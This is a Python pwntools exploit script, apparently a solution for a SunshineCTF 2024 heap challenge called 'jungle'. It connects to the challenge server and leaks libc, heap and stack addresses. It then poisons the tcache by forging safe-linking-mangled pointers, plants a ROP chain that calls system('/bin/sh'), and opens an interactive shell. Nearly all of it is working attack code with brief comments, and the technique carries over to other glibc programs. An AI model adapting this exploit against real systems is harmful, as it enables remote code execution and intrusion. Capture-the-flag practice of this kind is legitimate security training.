#!/usr/bin/env python3

from pwn import *

exe = ELF("./jungle.bin_patched")
libc = ELF("./libc_chall.so")
ld = ELF("./ld-2.39.so")

context.binary = exe
rounds = 1


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("2024.sunshinectf.games", 24005)

    return r


def use_item(index: int):
    global rounds

    r.sendlineafter(b">>> ", b"1")
    r.sendlineafter(b"(1-6) >>> ", str(index).encode("ascii"))
    rounds += 1


def add_item(index: int, name: bytes):
    global rounds

    r.sendlineafter(b">>> ", b"2")
    r.sendlineafter(b"(1-6) >>> ", str(index).encode("ascii"))
    r.sendafter(b"name >>> ", name)
    rounds += 1


def remove_item(index: int):
    global rounds

    r.sendlineafter(b">>> ", b"3")
    r.sendlineafter(b"(1-6) >>> ", str(index).encode("ascii"))
    rounds += 1


def leak_libc():
    add_item(6, b"Genie")
    use_item(6)

    libc.address = int(r.recvlines(2)[-1][-14:], 16) - libc.sym.printf
    log.info(f"libc @ 0x{libc.address:x}")


def main():
    r = conn()

    leak_libc()
    pop_rdi = ROP(libc).find_gadget(['pop rdi', 'ret'])[0]

    # We remove all the items from the knapsack so we have enough space
    # to allocate chunks. By overwriting last inserted chunk's fd, first
    # in the list, we are going to have just two chunks in tcache instead
    # of 6 as the program would have thought.
    for idx in range(6, 0, -1):
        remove_item(idx)

    remove_item(1)      # Set used[1] = 1 again
    remove_item(6)      # Needed to leak heap without much effort

    use_item(6)
    r.recvuntil(b"pocket 6: ")
    heap = int.from_bytes(r.recvline().strip(), "little") << 12
    log.info(f"heap @ 0x{heap:x}")

    ''' one gadget offsets
        * 0x583dc
        * 0x583e3
        * 0xef4ce
        * 0xef52b
    '''

    # mangled_ptr = prev_ptr ^ (heap_base >> 12)
    # e.g: 0x5e63c44d2050 = 0x5e66222f02a0 ^ (0x5e66222f0000 >> 12)

    # NOTE: hooks are present but not used in libc > 2.34
    # We use &environ-0x18 since program memsets the first 0x18 bytes
    add_item(1, p64((libc.sym.environ - 0x18) ^ (heap >> 12)))   # Overwrite fd ptr
    add_item(2, p64((libc.sym.environ - 0x18) ^ (heap >> 12)))   # Since it's the same chunk, copy-paste

    # -0x148

    add_item(3, b"AAAAAAAA" * 3)
    use_item(3)                     # Leak rbp
    r.recvuntil(b"AAAAAAAA" * 3)
    rbp = u64(r.recv(6).ljust(8, b"\x00")) - 0x148
    log.info(f"rbp @ 0x{rbp:x}")

    remove_item(2)      # Reuse 2nd chunk for more allocations
    remove_item(2)

    add_item(2, p64(rbp ^ (heap >> 12)))
    add_item(4, p64(rbp ^ (heap >> 12)))

    payload = flat(
                    rbp,
                    pop_rdi,
                    next(libc.search(b"/bin/sh\x00")),
                    pop_rdi + 1,        # Dummy return
                    libc.sym.system
                )

    add_item(5, payload)

    # Consume remaining tries
    for _ in range(rounds, 26):
        remove_item(77)         # Doesn't do anything

    r.clean(1)
    r.interactive("$ ")


if __name__ == "__main__":
    main()
